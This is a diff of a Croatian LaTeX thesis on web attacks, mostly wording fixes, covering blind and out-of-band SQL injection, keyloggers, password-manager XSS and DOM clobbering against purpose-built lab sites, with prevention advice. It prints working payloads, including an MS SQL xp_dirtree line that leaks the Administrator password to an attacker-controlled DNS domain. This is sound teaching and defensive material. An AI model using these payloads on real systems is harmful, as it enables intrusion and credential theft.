+AND SUBSTRING(password, 1, 1) > 'm') = 1 WAITFOR DELAY '0:0:{delay}'--
 \end{verbatim}
 
 \subsubsection{Slijepi SQLi korištenjem vankanalnim tehnikama}
-U situaciji kada web aplikacija izvršava prethodni SQL upit asinkrono, tada će se korisnikov HTTP zahtjev obrađivati u originalnoj dretvi, dok će se SQL upit obrađivati u zasebnoj dretvi. Upit je i dalje ranjiv na SQLi, međutim sve od dosad opisane tehnike su neučinkovite u ovoj situaciji. Razlog toga je što odgovor web aplikacije ne ovisi o tome dali postoji vremensko kašnjenje u izvršavanju upita, dali upit vraća ikakve podatke ili uzrokuje grešku baze podataka.
+U situaciji kada web aplikacija izvršava prethodni SQL upit asinkrono, tada će se korisnikov HTTP zahtjev obrađivati u originalnoj dretvi, dok će se SQL upit obrađivati u zasebnoj dretvi. Upit je i dalje ranjiv na SQLi, međutim sve dosad opisane tehnike su neučinkovite u ovoj situaciji. Razlog toga je što odgovor web aplikacije ne ovisi o tome dali postoji vremensko kašnjenje u izvršavanju upita, dali upit vraća ikakve podatke ili uzrokuje grešku baze podataka.
 
 U danoj situaciji, često je moguće zloupotrijebiti slijepu SQLi ranjivost uzrokovanjem vankanalne mrežne komunikacije sa sustavom kojeg napadač kontrolira. Kao i prije, ovakvo ponašanje se može uvjetno uzrokovati kako bi se informacije dohvaćale dio po dio. Međutim, postoji mogućnost izvlačenja podataka direktno iz mrežne komunikacije.
 
@@ -832,18 +861,23 @@ Za ovu svrhu se mogu iskoristiti razni mrežni protokoli, od kojih je najučinko
 Tehnika kojima je moguće uzrokovati DNS upit su usko vezane za tip baze podataka koji se koristi. Kod Microsoft SQL Serveru, naredba kojom se uzrokuje DNS upit na specifičnu domenu ima sljedeći oblik:
 
 \begin{verbatim}
-'; exec master..xp_dirtree '//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
+'; exec master..xp_dirtree 
+'//0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net/a'--
 \end{verbatim}
 
 Ova naredba će uzrokovati bazu podataka da izvrši DNS upit za domenu \texttt{0efdymgw1o5w9inae8mg4dfrgim9ay.burpcollaborator.net}
 
+\pagebreak
+
 Izvlačenje podataka iz baze se obavlja korištenjem sljedeće naredbe:
 
 \begin{verbatim}
-'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE username='Administrator');exec('master..xp_dirtree "//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.attackerdomain.net/a"')--
+'; declare @p varchar(1024);set @p=(SELECT password FROM users WHERE
+username='Administrator');exec('master..xp_dirtree 
+"//'+@p+'.cwcsgt05ikji0n1f2qlzn5118sek29.attackerdomain.net/a"')--
 \end{verbatim}
 
-Ova naredba čita lozinku korisnika \texttt{Administrator}, koja se nadodaje na domenu koju kontrolira napadač, \texttt{attackerdomain}, te se uzrokuje DNS upit. Ovo će rezultirati sljedećim upitom iz kojeg je moguće pročitati lozinku biranog korisnika:
+Ova naredba čita lozinku korisnika \texttt{Administrator}, koja se nadodaje na domenu koju kontrolira napadač, \texttt{attackerdomain}, te se uzrokuje DNS upit. Ovo će rezultirati sljedećim DNS upitom iz kojeg je moguće pročitati lozinku biranog korisnika:
 
 \begin{verbatim}
 S3cure.cwcsgt05ikji0n1f2qlzn5118sek29.attackerdomain.net
@@ -870,16 +904,17 @@ ResultSet resultSet = statement.executeQuery(query);
 Ovaj kod se može na jednostavan način preoblikovati kako bi onemogućili korisničkom unosu da poremeti strukturu upita:
 
 \begin{verbatim}
-PreparedStatement statement = connection.prepareStatement("SELECT * FROM products WHERE category = ?");
+PreparedStatement statement = 
+connection.prepareStatement("SELECT * FROM products WHERE category = ?");
 
 statement.setString(1, input);
 
 ResultSet resultSet = statement.executeQuery();
 \end{verbatim}
 
-Parametrizirani upiti se mogu koristiti u bilo kojoj situaciji gdje se nepovjerljivi podatci javljaju unutar upita, što uključuje \texttt{WHERE} izraz te vrijednosti unutar \texttt{INSERT} ili \texttt{UPDATE} izraza. Međutim, ovakvi upiti se ne mogu koristiti kada se nepovjerljivi podatci nalaze u drugim dijelovima upita, kao što su imena tablica i stupaca, ili \texttt{ORDER BY} izraz. Web aplikacija koja prima nepovjerljive podatke u tim dijelovima SQL upita treba koristi druge metode prevencije SQLi napada, poput propuštanja dopuštenih vrijednosti ili korištenje drugačije logike kako bi se postiglo traženo ponašanje.
+Parametrizirani upiti se mogu koristiti u bilo kojoj situaciji gdje se nepovjerljivi podatci javljaju unutar upita, što uključuje \texttt{WHERE} izraz te vrijednosti unutar \texttt{INSERT} ili \texttt{UPDATE} izraza. Međutim, ovakvi upiti se ne mogu koristiti kada se nepovjerljivi podatci nalaze u drugim dijelovima upita, kao što su imena tablica i stupaca, ili \texttt{ORDER BY} izraza. Web aplikacija koja prima nepovjerljive podatke u tim dijelovima SQL upita treba koristi druge metode prevencije SQLi napada, poput propuštanja dopuštenih vrijednosti ili korištenje drugačije logike kako bi se postiglo traženo ponašanje.
 
-Da bi parametrizirani upit bio učinkovit u sprečavanju SQLi napada, korišteni niz znakova (eng. string) mora uvijek biti tvrdo kodirana (eng. hard coded) konstanta te ne smije nikada sadržavati nikakvu varijablu. Primjena ovih metoda sprječavanja SQLi napada bi se trebala uraditi na svim situacijama u kojima se u SQL upit dodaje korisnički unos, a ne samo u onim slučajevima koje smatramo riskantnima, već u svim \cite{sitesqli}.
+Da bi parametrizirani upit bio učinkovit u sprečavanju SQLi napada, korišteni niz znakova (eng. string) mora uvijek biti tvrdo kodirana (eng. hard coded) konstanta te ne smije nikada sadržavati nikakvu varijablu. Primjena ovih metoda sprječavanja SQLi napada bi se trebala uraditi u svim situacijama u kojima se u SQL upit dodaje korisnički unos, a ne samo u onim slučajevima koje smatramo riskantnima \cite{sitesqli}.
 
 \section{Keylogger}
 Keylogger je program ili funkcija koja sprema sve što korisnik unese preko tipkovnice. Iz ovog razloga Keyloggeri su ozbiljna prijetnja korisnicima jer ovakvi programi mogu pratiti pritiske tipki kako bi ukrali lozinku ili neku drugu osjetljivu informaciju unesenu preko tipkovnice. Keyloggeri omogućavaju napadačima pristup PIN kodovima, lozinkama, brojevima računa i drugim osjetljivim informacijama.
@@ -888,6 +923,7 @@ Keyloggeri se mogu koristi za dohvaćanje privatnih podataka korisnika ili za š
 
 Način na koji keylogger funkcionira je da on remeti slijed događaja koji se obavljaju kada se pritisne tipka do trenutka kada se podatci pojave na ekranu\cite{key}.
 
+\pagebreak
 \subsection{Vrste keylogger-a}
 
 Keylogger se može implementirati hardverski i softverski. 
@@ -897,7 +933,7 @@ Hardverski keylogger-i mogu biti uređaji koji su ugrađeni unutar računalnog h
 Softverski keylogger je puno jednostavnije postaviti na žrtvino računalo, zbog toga je ovaj tip keylogger-a rašireniji. Za razliku od ostalih malicioznih softvera, softverski keylogger nisu prijetnje sistemu na kojem se nalaze. Čitava ideja keylogger je njihov rad u pozadini, hvatajući udare na tipkovnici dok računalo normalno funkcionira. Međutim, iako keylogger-i ne štete sustavu, oni su i dalje prijetnja za korisnika, pogotovo kada uhvate podatke koji su vezani za online plaćanje.
 
 \subsection{Zaštita od keylogger-a}
-Metode zaštite od keloggera su \cite{key2}
+Metode zaštite od keyloggera su \cite{key2}
 
 \begin{itemize}
 \item Pažljivo otvarati priloge. Dokumenti koji su primljeni preko e-maila, društvenih mreža, ili SMS poruka mogu u sebi nositi keylogger
@@ -907,7 +943,7 @@ Metode zaštite od keloggera su \cite{key2}
 
 \chapter{NAPADI}
 
-Kako bi se napadi mogli demonstrirati, za svaki pojedini napad su izrađene web stranice sa odgovarajućim ranjivostima. Ovisno o kakvoj ranjivosti je riječ, svaka web stranica posjeduje dogovarajuće tehnologije ili funkcionalnosti, pa su tako neke web stranice napravljene korištenjem Node.js i Express.js. Napravljene web stranice imaju rudimentarni izgled, napravljen korištenjem EJS-a, te sadrže samo one elemente koji su potrebni za demonstraciju ranjivosti i napada. Kako nekoliko ranjivosti, koji se obrađuju u ovom diplomskom radu, ne ovisi o tehnologiji back-end-a, web stranice za te ranjivosti su napravljene na istoj web aplikaciji koristeći prethodno navedene tehnologije. Preostale ranjivosti su izrađene korištenjem ASP .NET softverskog okvira te PHP serverskog skriptnog jezika. Razlog tome je što su odgovarajuće ranjivosti zahtijevale korištenje tih tehnologija.
+Kako bi se napadi mogli demonstrirati, za svaki pojedini napad su izrađene web stranice s odgovarajućim ranjivostima. Ovisno o kakvoj ranjivosti je riječ, svaka web stranica posjeduje dogovarajuće tehnologije ili funkcionalnosti, pa su tako neke web stranice napravljene korištenjem Node.js i Express.js. Konstruirane web stranice imaju rudimentarni izgled, napravljene korištenjem EJS-a, te sadrže samo one elemente koji su potrebni za demonstraciju ranjivosti i napada. Kako nekoliko ranjivosti, koji se obrađuju u ovom diplomskom radu, ne ovisi o tehnologiji back-end-a, takve web stranice su napravljene na istoj web aplikaciji koristeći prethodno navedene tehnologije. Preostale ranjivosti su izrađene korištenjem ASP .NET softverskog okvira te PHP serverskog skriptnog jezika. Razlog tome je što su odgovarajuće ranjivosti zahtijevale korištenje tih tehnologija.
 
 Napadi koji su obrađeni u ovom poglavlju su:
 
@@ -921,7 +957,7 @@ Napadi koji su obrađeni u ovom poglavlju su:
 
 \section{XSS napad preko upravitelja lozinki} \label{xss1}
 \subsection{Opis web stranice}
-Pretpostavimo web stranicu za prijavu na blog u kojoj se unose korisničko ime i lozinka unose u formu. Primjer ovakve web stranice je prikazan na slici \ref{fig:xss2cp}. Front-end kod web stranice je prikazan na slici \ref{fig:xss2cp_ejs} dok je back-end kod prikazana na slikama \ref{fig:xss2cp_b1} i \ref{fig:xss2cp_b2}. Uz sve navedeno, ova web stranica je povezana s MS SQL Serverom na kojem se nalazi baza podataka s korisničkim podatcima. 
+Pretpostavimo web stranicu za prijavu na blog u kojoj se unose korisničko ime i lozinka u formu. Primjer ovakve web stranice je prikazan na slici \ref{fig:xss2cp}. Front-end kod web stranice je prikazan na slici \ref{fig:xss2cp_ejs} dok je back-end kod prikazana na slikama \ref{fig:xss2cp_b1} i \ref{fig:xss2cp_b2}. Uz sve navedeno, ova web stranica je povezana s MS SQL Serverom na kojem se nalazi baza podataka s korisničkim podatcima. 
 
 \begin{figure}[H]
 	\begin{center}
@@ -951,7 +987,7 @@ Pretpostavimo web stranicu za prijavu na blog u kojoj se unose korisničko ime i
 	\end{center}
 \end{figure} 
 
-Ova web stranica šalje korisničke podatke upisane u formu POST zahtjevom na putanju \texttt{/xss-to-capture-pass/login} kao što se vidi na slici \ref{fig:xss2cp_ejs}. Kada web aplikacija primi korisničke podatke, šalje se SQL upit u bazu podata. Ako upit vrati nekakve detalje o korisniku, web stranica preusmjerava korisnika na blog, međutim, ako upit ne vrati nikakav rezultat, korisnika se ponovno vraća na istu web stranici. Opisano ponašanje se izvršava u \texttt{router.post} metodi za putanju \texttt{/xss-to-capture-pass/login}, što je prikazano na slici \ref{fig:xss2cp_b1}. Nakon što se korisnik uspješno prijavi na web stranicu, web aplikacija ga preusmjerava na blog web stranicu, koja je prikazana na slici \ref{fig:xss2cp_blog} te realizirana kodom sa slike \ref{fig:xss2cp_blog_f}.
+Ova web stranica šalje korisničke podatke upisane u formu POST zahtjevom na putanju \texttt{/xss-to-capture-pass/login} kao što se vidi na slici \ref{fig:xss2cp_ejs}. Kada web aplikacija primi korisničke podatke, šalje se SQL upit u bazu podata. Ako upit vrati nekakve detalje o korisniku, web stranica preusmjerava korisnika na blog, međutim, ako upit ne vrati nikakav rezultat, korisnika se ponovno vraća na istu web stranici. Opisano ponašanje se izvršava u \texttt{router.post} metodi za putanju \texttt{/xss-to-capture-pass/login}, što je prikazano na slici \ref{fig:xss2cp_b1}. Nakon što se korisnik uspješno prijavi na web stranicu, web aplikacija ga preusmjerava na blog web stranicu, koja je prikazana na slici \ref{fig:xss2cp_blog}, koja je realizirana kodom sa slike \ref{fig:xss2cp_blog_f}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1004,11 +1040,11 @@ Nakon što žrtva otvori web stranicu koja sadrži maliciozan članak, njezini k
 U ispisu HTTP zahtjeva, na napadačevom serveru, pod \texttt{query} vrijednosti su vidljivi lozinka i korisničko ime žrtve.
 
 \subsection{Sprječavanje napada}
-Kako ovaj napad ovisi o tome da upravitelj lozinki automatski obavi nadopunjavanje korisničkih podataka, vrlo jednostavan način obrane je koristiti upravitelje lozinki koji pitaju korisnika za dopuštenje prije nadopunjavanja korisničkog imena i lozinke. Upravitelji lozini koji je ugrađen u web preglednik Mozilla Firefox, na kojem je i izveden napad, ima zadanu opciju da upravitelj lozinki pita korisnika prije nadopunjavanja korisničkih podataka.
+Kako ovaj napad ovisi o tome da upravitelj lozinki automatski obavi nadopunjavanje korisničkih podataka, vrlo jednostavan način obrane je koristiti upravitelje lozinki koji pitaju korisnika za dopuštenje prije nadopunjavanja korisničkog imena i lozinke. Upravitelj lozinki koji je ugrađen u web preglednik Mozilla Firefox, na kojem je i izveden napad, ima zadanu opciju da upravitelj lozinki pita korisnika prije nadopunjavanja korisničkih podataka.
 
-Također, ovaj napad ovisi o tome da je moguće u blog članak napisati HTML kod koji sadrži nedopuštene znakove, popu šiljastih zagrada \texttt{<>}, dvostrukih navodnika \texttt{"}, jednostrukih navodnika \texttt{'}, vitičastih zagrada \texttt{\{\}}, itd. Ovo se može spriječiti tako da se tekst članka očisti ili sanitizira od nedopuštenih znakova ili se svi znakovi u tekstu članka mogu izbaciti (eng. to escape).
+Također, ovaj napad ovisi o tome dali  je moguće u blog članak napisati HTML kod koji sadrži nedopuštene znakove, popu šiljastih zagrada \texttt{<>}, dvostrukih navodnika \texttt{"}, jednostrukih navodnika \texttt{'}, vitičastih zagrada \texttt{\{\}}, itd. Ovo se može spriječiti tako da se tekst članka očisti ili sanitizira od nedopuštenih znakova ili se svi znakovi u tekstu članka mogu izbaciti (eng. to escape).
 
-Pored navedenih metoda, za sprječavanje HTML elemenata da šalju HTML zahtjeve na nepoznate URL adrese se može ograničiti primjenom CSP pravila. S CSP pravilima moguće je potpuno ograničiti skriptne HTTP zahtjeve, ili ih ograničiti na samo određene domene. Primjena CSP pravila koji ograničava HTTP zahtjev samo na \texttt{same-origin} adrese bi se preveniralo izvršavanje ovog napada \cite{x2cpport}.
+Pored navedenih metoda, za sprječavanje HTML elemenata da šalju HTML zahtjeve na nepoznate URL adrese se može ograničiti primjenom CSP pravila. S CSP pravilima moguće je potpuno ograničiti skriptne HTTP zahtjeve, ili ih ograničiti na samo određene domene. Primjena CSP pravila koja ograničavaju HTTP zahtjeve samo na \texttt{same-origin} adrese bi se preveniralo izvršavanje ovog napada \cite{x2cpport}.
 
 \section{DOM clobbering}
 \subsection{Opis web stranice}
@@ -1037,7 +1073,7 @@ Kod za front-end ovog bloga je prikazan na slici \ref{fig:dom_f}, a kod za back-
 	\end{center}
 \end{figure}
 
-Kada korisnik pošalje tekst blog članka, web aplikacija na back-endu obrađuje te podatke tako da ih pročisti odnosno sanitizira korištenjem \texttt{DOMPurify} JavaScript biblioteke. Ova biblioteka iz danog teksta briše nepoželjne HTML element i atribute, dok provjerene elemente ova biblioteka ne briše. Nakon što je teks članka pročišćen, on se prikazuje u blogu te se korisnika preusmjerava na web stranicu bloga kako bi vidio novi članak, što se vidi na slici \ref{fig:dom_b}.
+Kada korisnik pošalje tekst blog članka, web aplikacija na back-endu obrađuje te podatke tako da ih pročisti odnosno sanitizira korištenjem \texttt{DOMPurify} JavaScript biblioteke. Ova biblioteka iz danog teksta briše nepoželjne HTML element i atribute, dok provjerene elemente ova biblioteka ne briše. Nakon što je tekst članka pročišćen, on se prikazuje u blogu te se korisnika preusmjerava na web stranicu bloga kako bi vidio novi članak, što se vidi na slici \ref{fig:dom_b}.
 
 Na slici \ref{fig:dom_f} se vidi da web stranica sadrži skriptu koja, prilikom pokretanja web stranice, stvara HTML \texttt{script} element u koji se upisuje tekst. Novi skriptni element se zatim nadodaje u \texttt{body} element web stranice. Tekst koji se upisuje u skriptni element se prvobitno sprema u varijablu korištenjem sljedećeg dizajnerskog uzorka prikazanog na slici \ref{fig:dom_pat}.
 
@@ -1048,14 +1084,14 @@ Na slici \ref{fig:dom_f} se vidi da web stranica sadrži skriptu koja, prilikom 
 	\end{center}
 \end{figure}
 
-Ovaj dizajnerski uzorak koda se koristi kako bi zato da skripta nepotrebno ne stvara svojstvo objekta koje već postoji, što je u ovom slučaju svojstvo \texttt{doc}. U slučaju da to svojstvo ne postoji, tada se ono stvara sa željenom vrijednosti.
+Ovaj dizajnerski uzorak koda se koristi kako skripta nebi nepotrebno stvarala svojstvo objekta koje već postoji, što je u ovom slučaju svojstvo \texttt{doc}. U slučaju da to svojstvo ne postoji, tada se ono stvara sa željenom vrijednosti.
 
 \subsection{Opis Napada}
-Kako ova web stranica koristi dizajnerski uzorak prikazan na slici \ref{fig:dom_pat}, tako je ona ranjiva na DOM clobbering napad, jer taj dizajnerski uzorak obavlja inicijalizaciju varijable korištenjem kombinacije globalne varijable i logičkog operatora ILI \texttt{||}. Također, nepovoljna situacija po pitanju sigurnosti web stranice se stvara time što se vrijednost varijable \texttt{doc.path} postavlja u \texttt{script.innerHTML}, koja je nepouzdana funkcija.
+Kako ova web stranica koristi dizajnerski uzorak prikazan na slici \ref{fig:dom_pat}, tako je ona ranjiva na DOM clobbering napad, jer taj dizajnerski uzorak obavlja inicijalizaciju varijable korištenjem kombinacije globalne varijable i logičkog operatora ILI "\texttt{||}". Također, nepovoljna situacija po pitanju sigurnosti web stranice se stvara time što se vrijednost varijable \texttt{doc.path} postavlja u \texttt{script.innerHTML}, koja je nepouzdana funkcija.
 
-Način na koji napadač može zloupotrijebiti ovu ranjivost je da ugnjetava objekt \texttt{dom} i njegovo svojstvo \texttt{path}. Kako se skripta, koja se nalazi unutar HTML-a stranice izvršava prilikom svakog posjeta toj stranici, napadač može konstruirati blog članak koji bi ugnjetavao navedeni objekt i njegovo pripadajuće svojstvo. Prepreka u tom je što je čitavi tekst članka sanitiziran od nepoželjnih HTML elemenata i atributa. Jedan od dozvoljenih HTML elemenata je element \texttt{}, koji se koristi za stvaranje linkova na druge web stranice čija vrijednost je postavljena u \texttt{href} atributu. Međutim, ni u \texttt{href} atributu nisu dopušteni svi protokoli, kao na primjer \texttt{JavaScript:} koji omogućava pisanje JavaScript koda. U dopuštene protokole spadaju \texttt{http}, \texttt{https}, ali i \texttt{cid} protokol, preko kojega napadač može ubaciti maliciozan JavaScript kod.
+Način na koji napadač može zloupotrijebiti ovu ranjivost je da ugnjetava objekt \texttt{dom} i njegovo svojstvo \texttt{path}. Kako se skripta, koja se nalazi unutar HTML-a stranice izvršava prilikom svakog posjeta toj stranici, napadač može konstruirati blog članak koji bi ugnjetavao navedeni objekt i njegovo pripadajuće svojstvo. Prepreka u tome je što je čitavi tekst članka sanitiziran od nepoželjnih HTML elemenata i atributa. Jedan od dozvoljenih HTML elemenata je element \texttt{a}, koji se koristi za stvaranje linkova na druge web stranice čija vrijednost je postavljena u \texttt{href} atributu. Međutim, ni u \texttt{href} atributu nisu dopušteni svi protokoli, kao na primjer \texttt{javascript:} koji omogućava pisanje JavaScript koda. U dopuštene protokole spadaju \texttt{http}, \texttt{https}, ali i \texttt{cid} protokol, preko kojega napadač može ubaciti maliciozan JavaScript kod.
 
-Kada bi napadač ubacio tekst prikazan na slici u blog, napadač bi time dobio mogućnost izvršavanja bilo kojeg koda unutar web stranice.
+Kada bi napadač u blog ubacio tekst prikazan na slici \ref{fig:dom_pay}, on bi time dobio mogućnost izvršavanja bilo kojeg koda unutar web stranice.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1064,7 +1100,7 @@ Kada bi napadač ubacio tekst prikazan na slici u blog, napadač bi time dobio m
 	\end{center}
 \end{figure}
 
-Navedeni kod bi ugnjetavao referencu na objekt \texttt{doc} jer su kreirana dva HTML elementa s istom vrijednosti \texttt{id} atributa, te je ta vrijednost upravo \texttt{doc}. U slučaju kada postoje dva HTML elementa s istom vrijednosti atributa \texttt{id} DOM ih stavlja u DOM kolekciju, koja im oblik niza, gdje se svakom elementu pristupa preko broja mjesta u nizu. Ime ove DOM kolekcije glasi \texttt{dom}, jer je to vrijednost atributa koja je zajednička dvama elementima. Međutim, u ovom kodu drugi HTML element ima atribut \texttt{name} s vrijednošću \texttt{path}. U ovakvoj situaciji, drugom \texttt{a} elementu u DOM kolekciji se može pristupiti na korištenjem vrijednosti njegovog \texttt{name} atributa, što je u ovom slučaju \texttt{name}. Ovo znači da bi se vrijednosti \texttt{href} atributa drugog elementa moglo pristupiti preko reference \texttt{doc.path}. Iz ovog razloga bi web stranica u \texttt{script.innerHTML} pridijelila pogrešnu vrijednost, jer je originalna referenca na \texttt{doc.path} ugnjetavana.
+Navedeni kod bi ugnjetavao referencu na objekt \texttt{doc} jer su kreirana dva HTML elementa s istom vrijednošću \texttt{id} atributa, te je ta vrijednost upravo \texttt{doc}. U slučaju kada postoje dva HTML elementa s istom vrijednošću atributa \texttt{id} DOM ih stavlja u DOM kolekciju, koja ima oblik niza, gdje se svakom elementu pristupa preko broja mjesta u nizu. Ime ove DOM kolekcije glasi \texttt{dom}, jer je to vrijednost atributa koja je zajednička dvama elementima. Međutim, u ovom kodu drugi HTML element ima atribut \texttt{name} s vrijednošću \texttt{path}. U ovakvoj situaciji, drugom \texttt{a} elementu u DOM kolekciji se može pristupiti  korištenjem vrijednosti njegovog \texttt{name} atributa, što je u ovom slučaju \texttt{name}. Ovo znači da bi se vrijednosti \texttt{href} atributa drugog elementa moglo pristupiti preko reference \texttt{doc.path}. Iz ovog razloga bi web stranica u \texttt{script.innerHTML} pridijelila pogrešnu vrijednost, jer je originalna referenca na \texttt{doc.path} ugnjetavana.
 
 Nakon što se pošalje maliciozni tekst sa slike \ref{fig:dom_pay} te se web stranica ponovno učita, izvršava se kod koji se nalazi nakon oznake protokola unutar \texttt{href} atributa, što je u ovo slučaju \texttt{cid} protokol. Kako kod nakon \texttt{cid} protokola glasi \texttt{alert(1)}, web preglednik će stvoriti skočni prozor na kojem je napisan broj 1. Redoslijed odvijanja ovog napada se može vidjeti na slikama \ref{fig:dom_ab} i \ref{fig:dom_eff}.
 
@@ -1085,9 +1121,9 @@ Nakon što se pošalje maliciozni tekst sa slike \ref{fig:dom_pay} te se web str
 Ovime vidimo da na ovakav način napadač može zloupotrijebiti DOM clobbering ranjivost i dobiti mogućnost izvršavanja željenog koda unutar web stranice.
 
 \subsection{Sprječavanje napada}
-Najjednostavniji način prevencije ovakvog napada je izbjegavanje korištenje nesigurnog dizajnerskog uzorka koji je prikazan na slici \ref{fig:dom_pat}, u kojem se varijabla instancira korištenjem kombinacije globalne varijable ili objekta te logičko operatora ILI \texttt{||}.
+Najjednostavniji način prevencije ovakvog napada je izbjegavanje korištenje nesigurnog dizajnerskog uzorka koji je prikazan na slici \ref{fig:dom_pat}, u kojem se varijabla instancira korištenjem kombinacije globalne varijable ili objekta te logičkog operatora ILI "\texttt{||}".
 
-Također, je preporučljivo da se nad kritičnim objektima i referencama rade provjere kojima se utvrđuje da li one imaju očekivani oblik te da nisu DOM čvorovi. Drugi način sprječavanja ovakvog napada je korištenje dobro provjerenih i istestiranih biblioteka namijenjenih sprječavanju ovakvih napada.
+Također je preporučljivo da se nad kritičnim objektima i referencama rade provjere kojima se utvrđuje da li one imaju očekivani oblik te da nisu DOM čvorovi. Drugi način sprječavanja ovakvog napada je korištenje dobro provjerenih i istestiranih biblioteka namijenjenih prevenciji ovakvih napada.
 
 Kao i u prethodnom napadu, sprječavanje ovog napada se može postići escape-anjem teksta kojeg korisnik proslijedi web stranici. Kao što se vidi iz opisanog napada, sanitiziranje teksta članka nije bilo dovoljno striktno, stoga je potrebno dodati pravila koji ma se pooštrava filter koji se primjenjuje na tekst. Vrlo jednostavan način primjene ove metode je zabrana prihvaćanja bilo kakvog HTML koda u tekst članka.
 
@@ -1145,12 +1181,12 @@ U ovom kodu su prikazana dva međusoftvera (eng. middleware). Prvi međusoftver 
 
 Ako upit vrati detalje korisnika, tada su kolačići valjani. Ako kolačić ne postoji ili nije valjan, međusoftver generira grešku, u suprotnom se korisnika propušta do željene stranice.
 
-Način na koji back-end zna koji kolačić posjeduje korisnik, je da web preglednik korisnika, kada pristupa ovim stranicama, u HTTP zahtjevu šalje kolčić unutar \texttt{Cookie} zaglavlja.
+Način na koji back-end zna koji kolačić posjeduje korisnik, je da web preglednik, kada korisnik pristupa ovim stranicama, u HTTP zahtjevu šalje kolčić unutar \texttt{Cookie} zaglavlja.
 
 \subsection{Opis napada}
-Kako ova web aplikacija radi provjeru kolačića preko SQL upita, tako je ona podložna SQLi napadima. Međutim, ova web aplikacija ne prikazuje nikakvo drugačije ponašanje prilikom uzrokovanja kašnjenja ili grešaka u bazi podataka. Jedini način na koji se mogu izvući podatci iz baze je primjernom slijepog SQLi napada s vankanalnim izvlačenjem podataka. Ovo se može ostvariti je korištena MS SQL baza po svojim zadanim (eng. default) postavkama omogućava izvršavanje DNS upita. Uz to MS SQL podržava izvršavanje naslaganih upita (eng. stacked query), koji su potrebni prilikom izvođenja ovog napada.
+Kako ova web aplikacija radi provjeru kolačića preko SQL upita, tako je ona podložna SQLi napadima. Međutim, ova web aplikacija ne prikazuje nikakvo drugačije ponašanje prilikom uzrokovanja kašnjenja ili grešaka u bazi podataka. Jedini način na koji se mogu izvući podatci iz baze je primjernom slijepog SQLi napada s vankanalnim izvlačenjem podataka. Ovo se može ostvariti jer korištena MS SQL baza, po svojim zadanim (eng. default) postavkama, omogućava izvršavanje DNS upita. Uz to MS SQL podržava izvršavanje naslaganih upita (eng. stacked query), koji su potrebni prilikom izvođenja ovog napada.
 
-Da bi se ovaj napad mogao izvesti napadač mora napraviti vlastiti DNS server koji bi razlučivao zahtjeve na URL domenu koju on posjeduje. Za potrebe ove demonstracije DNS server, baza podata te web aplikacije se nalaze unutar lokalne mreže. Mrežna infrastruktura koja je korištena je prikazana na slici .
+Da bi se ovaj napad mogao izvesti napadač mora napraviti vlastiti DNS server koji bi razlučivao zahtjeve na domenu koju on posjeduje. Za potrebe ove demonstracije DNS server, baza podata te web aplikacije se nalaze unutar lokalne mreže. Mrežna infrastruktura koja je korištena je prikazana na slici \ref{fig:bsqli_arh}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1159,7 +1195,7 @@ Da bi se ovaj napad mogao izvesti napadač mora napraviti vlastiti DNS server ko
 	\end{center}
 \end{figure}
 
-Iz ove slike se vidi da se MS SQL baza podataka nalazi unutar \texttt{loopback} mreže s adresom \texttt{127.0.0.0}. Napadačev DNS server, koji razlučuje upite prema domeni koju napadač kontrolira, se nalazi unutar virtualne mreže VirtualBox. Za potrebe demonstracije ovog napada DNS server je postavljen unutra virtualne mreže na Kali Linux virtualnoj mašini. Računalo koje je prikazano u infrastrukturi ima pokrenutu Kali Linux virtualnu mašinu te MS SQL bazu podataka. Računalo s virtualnom mašinom komunicira preko virtualnog adaptera koji računalu daje zasebnu IP adresu unutar virtualne mreže. Računalo u ovoj situaciji ima ulogu posrednika između MS SQL baze podataka i DNS servera. Kako je MS SQL pokrenut na računalu, tako obradu svih mrežnih zahtjeva baze podataka vrši računalo. U te mrežne zahtjeve spadaju i DNS upiti koje MS SQL baza prosljeđuje računalo, kako bi ono pronašlo odgovarajuće servere. Kako bi računalo moglo razlučiti sve domene u IP adrese, u mrežnim postavkama računala su postavljene IP adrese DNS server, koji se mogu vidjeti na slici \ref{fig:bsqli_ns}.
+Iz ove slike se vidi da se MS SQL baza podataka nalazi unutar \texttt{loopback} mreže s adresom \texttt{127.0.0.0} . Napadačev DNS server, koji razlučuje upite prema domeni koju napadač kontrolira, se nalazi unutar virtualne mreže VirtualBox. Za potrebe demonstracije ovog napada DNS server je postavljen unutra virtualne mreže na Kali Linux virtualnoj mašini. Računalo koje je prikazano u infrastrukturi ima pokrenutu Kali Linux virtualnu mašinu te MS SQL bazu podataka. Računalo s virtualnom mašinom komunicira preko virtualnog adaptera koji računalu daje zasebnu IP adresu unutar virtualne mreže. Računalo u ovoj situaciji ima ulogu posrednika između MS SQL baze podataka i DNS servera te ulogu računala napadača, na koje će doći podatci iz baze. Kako je MS SQL pokrenut na računalu, tako obradu svih mrežnih zahtjeva baze podataka vrši računalo. U te mrežne zahtjeve spadaju i DNS upiti koje MS SQL baza prosljeđuje računalu, kako bi ono pronašlo odgovarajuće servere. Da bi računalo moglo razlučiti sve domene u IP adrese, u mrežnim postavkama računala su postavljene IP adrese DNS server, koji se mogu vidjeti na slici \ref{fig:bsqli_ns}.
 
 \begin{figure}[H]
 	\begin{center}
@@ -1168,7 +1204,7 @@ Iz ove slike se vidi da se MS SQL baza podataka nalazi unutar \texttt{loopback} 
 	\end{center}
 \end{figure}
 
-U mrežnim postavkama se mogu vidjeti dvije IP adrese za DNS servere. Prva IP adresa se odnosi na napadače DNS server pokrenut na Kali Linux mašini s adresom \texttt{192.168.56.101}, dok se druga adresa \texttt{192.168.1.1}, odnosi na DNS server koji se koristi za razlučivanje domena za ostatak interneta.
+U mrežnim postavkama se mogu vidjeti dvije IP adrese za DNS servere. Prva IP adresa se odnosi na napadačev DNS server pokrenut na Kali Linux mašini s adresom \texttt{192.168.56.101}, dok se druga adresa \texttt{192.168.1.1}, odnosi na DNS server koji se koristi za razlučivanje domena za ostatak interneta.
 
 Kako bi se na Kali Linux postavio DNS server, koristi se BIND alat. Da bi se postavile domene koje DNS server može razlučivati potrebno je instalirati BIND na Linux sustav. Zatim, je potrebno kreirati zonu za lokalnu domenu te subdomenu koja će se koristiti. Da bi se to ostvarilo mora se modificirati dokument \texttt{named.conf.options} kao što se vidi na slici \ref{fig:bsqli_nco}.
 
